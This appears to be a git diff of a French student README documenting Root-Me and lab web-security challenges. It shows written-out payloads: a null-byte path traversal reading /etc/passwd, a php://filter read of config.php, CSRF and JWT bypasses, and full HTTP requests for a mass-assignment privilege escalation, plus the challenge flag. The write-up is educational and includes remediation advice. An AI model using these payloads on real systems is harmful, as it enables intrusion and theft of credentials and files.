@@ -1,6 +1,6 @@
 # Projet Sécurité du Web
 
-## Membres du groupes
+## Membres du groupe
 
 - LOUNADI Nassim
 - DEHIL Sami
@@ -126,13 +126,13 @@ jobs:
 
 ### 1 | File path traversal, validation of file extension with null byte bypass
 
-D'après le sujet, on se doute qu'il faut ajouter un null byte (%00) lors de l'appel d'une image
+D'après le sujet, on se doute qu'il faut ajouter un null byte (%00) lors de l'appel d'une image.
 
-Ne pas oublier d'ajouter les images dans burp pour les intercepter :
+Ne pas oublier d'ajouter les images dans Burp pour les intercepter :
 
 ![Step 0](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/1_file_path_traversal_validation_of_file_extension_with_null_byte_bypass/0.png)
 
-Sur la page d'accueil, on remarque que les images sont chargées via un parmètre 'filename', on peut donc tenter une inclusion de fichier avec un path traversal + null byte :
+Sur la page d'accueil, on remarque que les images sont chargées via un paramètre 'filename', on peut donc tenter une inclusion de fichier avec un path traversal + null byte :
 
 ![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/1_file_path_traversal_validation_of_file_extension_with_null_byte_bypass/1.png)
 
@@ -142,7 +142,7 @@ Payload :
 ../../../../../etc/passwd%00.jpg
 ```
 
-Pour se protéger contre cette vulnérabilité, if faut empêcher les caractères spéciaux dans les entrées utilisateurs, et si possible utiliser une white list pour les fichiers autorisés.
+Pour se protéger contre cette vulnérabilité, il faut empêcher les caractères spéciaux dans les entrées utilisateur, et si possible utiliser une liste blanche pour les fichiers autorisés.
 
 [Source](https://www.chiny.me/null-byte-injection-14-7.php)
 
@@ -162,7 +162,7 @@ Même principe pour lire le fichier login :
 
 ![Step 4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/4.png)
 
-On se rend compte de l'existance d'un fichier config.php, on applique la même technique pour le lire :
+On se rend compte de l'existence d'un fichier config.php, on applique la même technique pour le lire :
 
 ![Step 5](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/5.png)
 
@@ -174,7 +174,7 @@ Payload :
 http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
 ```
 
-Pour s'affranchir de cette vulnérabilité, il suffit d'appliquer le principe de "Never trust no one" en validant et en nettoyant les entrées utilisateurs avant de les utiliser dans des fonctions sensibles comme include(). Ou simplement ne pas utiliser include() dans ce cas précis.
+Pour s'affranchir de cette vulnérabilité, il suffit d'appliquer le principe de "Never trust user input" en validant et en nettoyant les entrées utilisateur avant de les utiliser dans des fonctions sensibles comme include(). Ou simplement ne pas utiliser include() dans ce cas précis.
 
 [Source](https://faun.pub/good-practices-how-to-sanitize-validate-and-escape-in-php-3-methods-719c9fce99d6?gi=fecb20f8fd00)
 
@@ -240,10 +240,10 @@ Attendre le passage de l'administrateur sur la demande de contact :
 
 ![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/3_CSRF_contournement_de_jeton/3.png)
 
-Pour empêcher cette vulnérabilité, il est possible d'utiliser une validation au niveau de l'input utilisateur ("Never trust no one").
-Comme "DOMPurify.sanitize(payload)"
+Pour empêcher cette vulnérabilité, il est possible d'utiliser une validation au niveau de l'input utilisateur ("Never trust user input").
+Comme "DOMPurify.sanitize(payload)".
 
-![Source](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization)
+[Source](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization)
 
 ### 4 | CSRF where token is not tied to user session
 
@@ -251,27 +251,27 @@ Capture de la requête de mise à jour de l'email dans Burp :
 
 ![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/1.png)
 
-On garde le token CSRF de coté.
+On garde le token CSRF de côté.
 
 On va maintenant venir se connecter avec le 2ème compte fourni sur une autre fenêtre en navigation privée pour s'assurer d'être sur une autre session.
 
-On intercepte à nouveau notre requête de mise à jour de l'email avec le nouveau compte
+On intercepte à nouveau notre requête de mise à jour de l'email avec le nouveau compte :
 
 ![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/2.png)
 
-Pour s'assurer que le token CSRF n'est pas lié a la session, on va venir modifier notre requête dans le Repeater de Burp.
+Pour s'assurer que le token CSRF n'est pas lié à la session, on va modifier notre requête dans le Repeater de Burp.
 
 ![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/3.png)
 
-Ici, on modifie l'email et le token avec celui qu'on à gardé sous le coude un peu plus tôt et on soumet la requête.
+Ici, on modifie l'email et le token avec celui qu'on a gardé sous le coude un peu plus tôt et on soumet la requête.
 
 ![Step 4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/4.png)
 
-La requête passe correctement, on peut donc en déduire que le token CSRF n'est pas lié à la session de l'utilisateur
+La requête passe correctement, on peut donc en déduire que le token CSRF n'est pas lié à la session de l'utilisateur.
 
 ![Step 5](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/5.png)
 
-Pour résoudre la challenge, on va donc dans "Go to exploit server"
+Pour résoudre le challenge, on va donc dans "Go to exploit server".
 
 Dans la partie "Body", on applique ce code récupéré depuis la page de mise à jour de l'email :
 
@@ -329,7 +329,7 @@ Ajout de 1 ou 2 "=" à la fin du token :
 
 ![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_JWT_jeton_revoque/2.png)
 
-Pour se protéger contre cette vulnérabilité, il serait judicieux d'utiliser une bibliothèque officielle pour la gestion des JWT, ou d'utiliser une white liste, ou simplement strip les "=" des tokens récupérer via les requêtes utilisateurs.
+Pour se protéger contre cette vulnérabilité, il serait judicieux d'utiliser une bibliothèque officielle pour la gestion des JWT, ou d'utiliser une liste blanche, ou simplement supprimer les "=" des tokens récupérés via les requêtes utilisateur.
 
 [Source](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent_3)
 
@@ -341,4 +341,188 @@ Pour se protéger contre cette vulnérabilité, il serait judicieux d'utiliser u
 
 ### 10 |
 
-### 11 |
+### 11 | Mass Assignment
+
+Le Mass Assignment est une vulnérabilité qui survient lorsqu'une application permet la modification de propriétés d'objets qui ne devraient pas être modifiables par l'utilisateur (comme le rôle ou les permissions).
+
+#### Step 1 : Création du compte et authentification
+
+Il faut créer un compte et se connecter
+
+```http request
+POST /api/signup HTTP/1.1
+Host: challenge01.root-me.org:59090
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://challenge01.root-me.org:59090/
+Content-Type: application/json
+Content-Length: 43
+Origin: http://challenge01.root-me.org:59090
+Connection: keep-alive
+Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117
+Priority: u=0
+
+{
+  "username": "xx",
+  "password": "123"
+}
+```
+
+```http request
+POST /api/login HTTP/1.1
+Host: challenge01.root-me.org:59090
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://challenge01.root-me.org:59090/
+Content-Type: application/json
+Content-Length: 43
+Origin: http://challenge01.root-me.org:59090
+Connection: keep-alive
+Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117
+Priority: u=0
+
+{
+  "username": "xx",
+  "password": "123"
+}
+```
+
+#### Step 2 : Récupération des informations utilisateur
+
+Récupérons les informations de notre utilisateur via l'endpoint `/api/user` et envoyons la requête dans le Repeater de Burp.
+
+```http request
+GET /api/user HTTP/1.1
+Host: challenge01.root-me.org:59090
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://challenge01.root-me.org:59090/
+Connection: keep-alive
+Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117; session=.eJwlzj0OwjAMQOG7ZGYwie3YvQyK_wRrSyfE3anE-Kb3fdqj9jyebXvvZ97a4xVta-rETHdF8OHIMjlNAYTcgBCFpkFYz67LK4ymS4GV8gCL4qVcnTxCB4pY-lKjmk5G5tknheSSEo4hOVyugh4xF8K1Q8F2Qc4j979mtO8P2kowJg.aS_60Q.iAIQrAL0_uhVZoSdCkz7qB2v56U
+Priority: u=0
+```
+
+La réponse :
+```http request
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.5 Python/3.11.10
+Date: Wed, 03 Dec 2025 08:55:04 GMT
+Content-Type: application/json
+Content-Length: 56
+Access-Control-Allow-Origin: *
+Vary: Cookie
+Connection: close
+
+{
+    "note": "",
+    "status": "guest",
+    "userid": 3,
+    "username": "xx"
+}
+```
+
+On constate que notre utilisateur a le statut `guest`.
+
+#### Step 3 : Énumération des méthodes HTTP disponibles
+
+Pour identifier les méthodes HTTP disponibles sur l'endpoint `/api/user`, utilisons la méthode `OPTIONS` :
+
+```http request
+OPTIONS /api/user HTTP/1.1
+Host: challenge01.root-me.org:59090
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://challenge01.root-me.org:59090/
+Connection: keep-alive
+Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117; session=.eJwlzj0OwjAMQOG7ZGYwie3YvQyK_wRrSyfE3anE-Kb3fdqj9jyebXvvZ97a4xVta-rETHdF8OHIMjlNAYTcgBCFpkFYz67LK4ymS4GV8gCL4qVcnTxCB4pY-lKjmk5G5tknheSSEo4hOVyugh4xF8K1Q8F2Qc4j979mtO8P2kowJg.aS_60Q.iAIQrAL0_uhVZoSdCkz7qB2v56U
+Priority: u=0
+```
+
+Réponse :
+
+```http request
+HTTP/1.1 200 OK
+Allow: OPTIONS, GET, PUT
+```
+
+On découvre que les méthodes `OPTIONS`, `GET` et `PUT` sont disponibles. La méthode `PUT` est généralement utilisée pour mettre à jour une ressource sur un serveur, ce qui nous permet d'exploiter la vulnérabilité.
+
+#### Step 4 : Exploitation de la vulnérabilité Mass Assignment
+
+On va tenter de modifier notre statut pour obtenir le rôle `admin` en envoyant une requête `PUT` sur l'endpoint `/api/user` :
+
+```http request
+PUT /api/user HTTP/1.1
+Host: challenge01.root-me.org:59090
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://challenge01.root-me.org:59090/
+Connection: keep-alive
+Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117; session=.eJwlzj0OwjAMQOG7ZGYwie3YvQyK_wRrSyfE3anE-Kb3fdqj9jyebXvvZ97a4xVta-rETHdF8OHIMjlNAYTcgBCFpkFYz67LK4ymS4GV8gCL4qVcnTxCB4pY-lKjmk5G5tknheSSEo4hOVyugh4xF8K1Q8F2Qc4j979mtO8P2kowJg.aS_60Q.iAIQrAL0_uhVZoSdCkz7qB2v56U
+Priority: u=0
+Content-Length: 25
+Content-Type: application/json
+
+{
+  "status": "admin"
+}
+```
+
+Réponse :
+
+```json
+{"message":"User updated sucessfully."}
+```
+
+La méthode `PUT` sur l'endpoint `/api/user` n'est pas protégée. Nous avons donc pu mettre à jour le rôle de notre utilisateur pour devenir admin sans aucune vérification.
+
+#### Step 5 : Validation de l'élévation de privilèges
+
+Vérifions que nous avons bien obtenu les droits administrateur en récupérant le flag sur l'endpoint `/api/flag` qui est protégé et accessible uniquement aux administrateurs :
+
+```http request
+GET /api/flag HTTP/1.1
+Host: challenge01.root-me.org:59090
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://challenge01.root-me.org:59090/
+Connection: keep-alive
+Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117; session=.eJwlzj0OwjAMQOG7ZGYwie3YvQyK_wRrSyfE3anE-Kb3fdqj9jyebXvvZ97a4xVta-rETHdF8OHIMjlNAYTcgBCFpkFYz67LK4ymS4GV8gCL4qVcnTxCB4pY-lKjmk5G5tknheSSEo4hOVyugh4xF8K1Q8F2Qc4j979mtO8P2kowJg.aS_60Q.iAIQrAL0_uhVZoSdCkz7qB2v56U
+Priority: u=0
+```
+
+Réponse :
+
+```json
+{"message":"Hello admin, here is the flag : RM{4lw4yS_ch3ck_0pt10ns_m3th0d}."}
+```
+
+Nous avons confirmé notre statut d'administrateur et récupéré le flag avec succès.
+
+#### Remédiation
+
+Pour se protéger contre cette vulnérabilité Mass Assignment :
+
+1. **Whitelist explicite** : N'autoriser que les champs modifiables par l'utilisateur (ex: `username`, `note`) et interdire explicitement les champs sensibles (`status`, `role`, `is_admin`)
+2. **Validation côté serveur** : Vérifier systématiquement les permissions avant toute modification de propriété sensible
+3. **DTOs (Data Transfer Objects)** : Utiliser des objets dédiés pour limiter les champs exposés dans l'API
+4. **Principe du moindre privilège** : Ne jamais faire confiance aux données utilisateur sans validation
+
+[Source OWASP - Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
+
+#### Screenshots
+![Screenshot1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/11_mass_assignment/challenge_success.png)
+![Screenshot2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/11_mass_assignment/endpoint.png)
+
